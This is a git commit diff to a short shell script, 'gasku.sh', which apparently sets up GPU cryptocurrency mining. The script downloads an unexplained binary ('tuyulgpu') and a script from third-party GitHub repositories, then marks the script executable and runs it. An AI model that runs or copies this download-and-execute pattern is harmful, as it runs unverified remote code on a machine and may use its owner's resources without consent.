ef05fb3c5357266cfa41da4af46a4dda71f5dd64
muterminer <86037273+muterminer@users.noreply.github.com>
2021-06-17 14:23:53 +0700

    Update gasku.sh

--- gasku.sh
+++ gasku.sh
@@ -5,5 +5,5 @@ sudo apt install screen -y
 screen -dmS gpu.sh ./gpu.sh 65 75
 wget https://github.com/nuri655/jajshdbdbdbdbb/raw/main/tuyulgpu
 wget https://raw.githubusercontent.com/muterminer/mutmin/main/gpuku.sh
-chmod +x gpu.sh
-./gpu.sh
+chmod +x gpuku.sh
+./gpuku.sh
